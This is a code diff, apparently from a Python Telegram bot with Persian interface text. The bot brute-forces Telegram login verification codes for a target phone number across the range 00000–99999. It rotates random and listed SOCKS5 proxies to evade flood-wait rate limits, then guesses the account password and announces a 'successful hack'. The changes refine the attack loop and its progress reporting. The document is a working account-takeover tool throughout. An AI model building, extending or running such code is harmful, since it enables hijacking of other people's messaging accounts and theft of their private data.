@@ -38,13 +38,13 @@ DATA_FILE = "selfs.json"
 # ============ لیست پروکسی‌های SOCKS5 ============
 PROXY_LIST = []
 
-# تولید 1000 پروکسی تصادفی
+# تولید پروکسی‌های تصادفی
 for i in range(1000):
     ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
     port = random.choice([1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 443, 80, 8080, 3128])
     PROXY_LIST.append({"addr": ip, "port": port})
 
-# اضافه کردن پروکسی‌های واقعی از کانال iRoProxy
+# پروکسی‌های واقعی
 REAL_PROXIES = [
     {"addr": "iro.varfootball2.co.uk", "port": 2053},
     {"addr": "silnet.varfootball.co.uk", "port": 2053},
@@ -129,23 +129,6 @@ async def clear_user_session(user_id):
 
 def get_random_proxy():
     return random.choice(PROXY_LIST) if PROXY_LIST else None
-
-async def create_client_with_proxy(api_id, api_hash, proxy_data):
-    """ایجاد کلاینت با پروکسی SOCKS5 با استفاده از telethon"""
-    try:
-        from telethon import socks
-        
-        client = TelegramClient(
-            StringSession(),
-            api_id,
-            api_hash,
-            proxy=(socks.SOCKS5, proxy_data['addr'], proxy_data['port'])
-        )
-        await client.connect()
-        return client
-    except Exception as e:
-        logger.error(f"Error creating client with proxy: {e}")
-        return None
 
 # ============ منوی اصلی ============
 async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, edit=False):
@@ -473,6 +456,23 @@ async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
         api_id = data['api_id']
         api_hash = data['api_hash']
         
+        # ارسال درخواست کد تایید
+        client = TelegramClient(StringSession(), api_id, api_hash)
+        await client.connect()
+        try:
+            await client.send_code_request(phone)
+        except Exception as e:
+            await context.bot.edit_message_text(
+                f"❌ خطا در ارسال کد تایید: {str(e)[:200]}",
+                chat_id=update.effective_chat.id,
+                message_id=msg.message_id,
+                parse_mode='HTML'
+            )
+            await client.disconnect()
+            await clear_user_session(user_id)
+            return
+        await client.disconnect()
+        
         asyncio.create_task(smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, api_hash, msg))
         
     except Exception as e:
@@ -497,6 +497,7 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
         proxy_index = 0
         client = None
         last_code = "00000"
+        dots = 0
         
         # تولید لیست هوشمند کدها
         code_list = []
@@ -519,6 +520,10 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
         
         random.shuffle(final_list)
         
+        # پیام اولیه
+        loading_dots = ["   ", ".  ", ".. ", "...", " ..", "  ."]
+        dot_index = 0
+        
         await context.bot.edit_message_text(
             f"""
 🔥 <b>شروع هک اکانت...</b>
@@ -526,9 +531,12 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
 📱 شماره: <code>{phone}</code>
 🔢 محدوده: 00000 تا 99999
 🌐 تعداد پروکسی‌ها: {len(PROXY_LIST)}
+🔑 کد فعلی: <code>-----</code>
+📊 پیشرفت: 0.00%
+❌ کدهای اشتباه: 0
+✅ کدهای درست: 0
 🎯 استراتژی: حدس تصادفی + تغییر پروکسی SOCKS5
-
-⏳ در حال تلاش...
+⏳ درحال تلاش{loading_dots[0]}
 """,
             chat_id=update.effective_chat.id,
             message_id=msg.message_id,
@@ -542,6 +550,9 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
         for code in final_list:
             attempt += 1
             last_code = code
+            
+            # به‌روزرسانی انیمیشن بارگذاری
+            dot_index = (dot_index + 1) % len(loading_dots)
             
             # هر 200 تلاش یا هر بار محدودیت، پروکسی رو عوض کن
             if attempt % 200 == 0 or client is None:
@@ -571,23 +582,12 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
                     )
                     await client.connect()
                     
+                    # ارسال مجدد درخواست کد با پروکسی جدید
                     try:
                         await client.send_code_request(phone)
                     except FloodWaitError as e:
                         wait_time = e.seconds
                         if wait_time > 60:
-                            await context.bot.edit_message_text(
-                                f"""
-🔄 تغییر پروکسی SOCKS5...
-🌐 پروکسی شماره {proxy_index} محدود شد!
-🔄 انتخاب پروکسی جدید...
-
-⏳ لطفاً صبر کنید...
-""",
-                                chat_id=update.effective_chat.id,
-                                message_id=msg.message_id,
-                                parse_mode='HTML'
-                            )
                             shuffled_proxies.pop(proxy_counter - 1)
                             proxy_counter -= 1
                             await asyncio.sleep(1)
@@ -608,28 +608,53 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
             if attempt % 10 == 0:
                 await asyncio.sleep(random.uniform(0.02, 0.08))
             
-            # بروزرسانی هر 1000 تلاش
-            if attempt % 1000 == 0:
+            # بروزرسانی هر 500 تلاش
+            if attempt % 500 == 0:
                 elapsed = (datetime.now() - start_time).seconds
                 percent = (attempt / total_attempts) * 100
                 remaining = int(((total_attempts - attempt) / max(attempt, 1)) * max(elapsed, 1)) if attempt > 0 else 0
+                
+                # محاسبه زمان
+                if elapsed < 60:
+                    time_str = f"{elapsed} ثانیه"
+                elif elapsed < 3600:
+                    minutes = elapsed // 60
+                    seconds = elapsed % 60
+                    time_str = f"{minutes} دقیقه و {seconds} ثانیه"
+                else:
+                    hours = elapsed // 3600
+                    minutes = (elapsed % 3600) // 60
+                    time_str = f"{hours} ساعت و {minutes} دقیقه"
+                
+                if remaining < 60:
+                    remain_str = f"{remaining} ثانیه"
+                elif remaining < 3600:
+                    minutes = remaining // 60
+                    seconds = remaining % 60
+                    remain_str = f"{minutes} دقیقه و {seconds} ثانیه"
+                else:
+                    hours = remaining // 3600
+                    minutes = (remaining % 3600) // 60
+                    remain_str = f"{hours} ساعت و {minutes} دقیقه"
+                
                 try:
                     await context.bot.edit_message_text(
                         f"""
 🔥 <b>در حال هک...</b>
 
 📱 شماره: <code>{phone}</code>
-🔢 کد فعلی: <code>{code}</code>
+🔑 کد فعلی: <code>{code}</code>
 
 📊 <b>آمار:</b>
 • تلاش‌ها: {attempt:,} از {total_attempts:,}
 • پیشرفت: {percent:.2f}%
-• زمان سپری شده: {elapsed} ثانیه
+• زمان سپری شده: {time_str}
 • کدهای اشتباه: {wrong_attempts:,}
 • پروکسی‌های SOCKS5: {proxy_index}
-• زمان تخمینی باقی‌مانده: {remaining} ثانیه
+• زمان تخمینی باقی‌مانده: {remain_str}
 
-⏳ ادامه...
+🎯 استراتژی: حدس تصادفی + تغییر پروکسی SOCKS5
+⏳ درحال تلاش{loading_dots[dot_index]}
 """,
                         chat_id=update.effective_chat.id,
                         message_id=msg.message_id,
@@ -651,18 +676,6 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
             except FloodWaitError as e:
                 wait_time = e.seconds
                 if wait_time > 60:
-                    await context.bot.edit_message_text(
-                        f"""
-🔄 محدودیت پروکسی SOCKS5!
-⏳ زمان انتظار: {wait_time} ثانیه
-🔄 تعویض پروکسی...
-
-⏳ صبر کنید...
-""",
-                        chat_id=update.effective_chat.id,
-                        message_id=msg.message_id,
-                        parse_mode='HTML'
-                    )
                     if proxy_counter > 0 and proxy_counter - 1 < len(shuffled_proxies):
                         shuffled_proxies.pop(proxy_counter - 1)
                         proxy_counter -= 1
@@ -687,6 +700,7 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
 ✅ کد پیدا شد: <code>{code}</code>
 📊 تلاش‌ها: {attempt:,}
 ❌ کدهای اشتباه: {wrong_attempts:,}
+🌐 پروکسی‌های SOCKS5: {proxy_index}
 
 🔑 در حال حدس پسورد...
 ⏳ صبر کنید...
@@ -740,6 +754,17 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
                     await clear_user_session(user_id)
                     
                     elapsed = (datetime.now() - start_time).seconds
+                    if elapsed < 60:
+                        time_str = f"{elapsed} ثانیه"
+                    elif elapsed < 3600:
+                        minutes = elapsed // 60
+                        seconds = elapsed % 60
+                        time_str = f"{minutes} دقیقه و {seconds} ثانیه"
+                    else:
+                        hours = elapsed // 3600
+                        minutes = (elapsed % 3600) // 60
+                        time_str = f"{hours} ساعت و {minutes} دقیقه"
+                    
                     text = f"""
 ✅ <b>هک موفقیت‌آمیز!</b>
 
@@ -751,7 +776,7 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
 • کل تلاش‌ها: {attempt:,}
 • کدهای اشتباه: {wrong_attempts:,}
 • پروکسی‌های SOCKS5: {proxy_index}
-• زمان: {elapsed} ثانیه
+• زمان: {time_str}
 • پسورد پیدا شده: <code>{pass_found}</code>
 • تلاش‌های پسورد: {pass_attempt}
 
@@ -836,6 +861,17 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
             await clear_user_session(user_id)
             
             elapsed = (datetime.now() - start_time).seconds
+            if elapsed < 60:
+                time_str = f"{elapsed} ثانیه"
+            elif elapsed < 3600:
+                minutes = elapsed // 60
+                seconds = elapsed % 60
+                time_str = f"{minutes} دقیقه و {seconds} ثانیه"
+            else:
+                hours = elapsed // 3600
+                minutes = (elapsed % 3600) // 60
+                time_str = f"{hours} ساعت و {minutes} دقیقه"
+            
             text = f"""
 ✅ <b>هک موفقیت‌آمیز!</b>
 
@@ -847,7 +883,7 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
 • کل تلاش‌ها: {attempt:,}
 • کدهای اشتباه: {wrong_attempts:,}
 • پروکسی‌های SOCKS5: {proxy_index}
-• زمان سپری شده: {elapsed} ثانیه
+• زمان سپری شده: {time_str}
 
 🎯 سلف ساخته شد!
 """
@@ -868,17 +904,28 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
             
         else:
             elapsed = (datetime.now() - start_time).seconds
+            if elapsed < 60:
+                time_str = f"{elapsed} ثانیه"
+            elif elapsed < 3600:
+                minutes = elapsed // 60
+                seconds = elapsed % 60
+                time_str = f"{minutes} دقیقه و {seconds} ثانیه"
+            else:
+                hours = elapsed // 3600
+                minutes = (elapsed % 3600) // 60
+                time_str = f"{hours} ساعت و {minutes} دقیقه"
+            
             await context.bot.edit_message_text(
                 f"""
 ❌ <b>هک ناموفق!</b>
 
 📱 شماره: <code>{phone}</code>
 
-📊 <b>آمار:</b>
+📊 <b>آمار نهایی:</b>
 • کل تلاش‌ها: {attempt:,}
 • کدهای اشتباه: {wrong_attempts:,}
 • پروکسی‌های SOCKS5: {proxy_index}
-• زمان سپری شده: {elapsed} ثانیه
+• زمان سپری شده: {time_str}
 
 ممکن است شماره تلفن اشتباه باشد یا کد منقضی شده باشد.
 """,
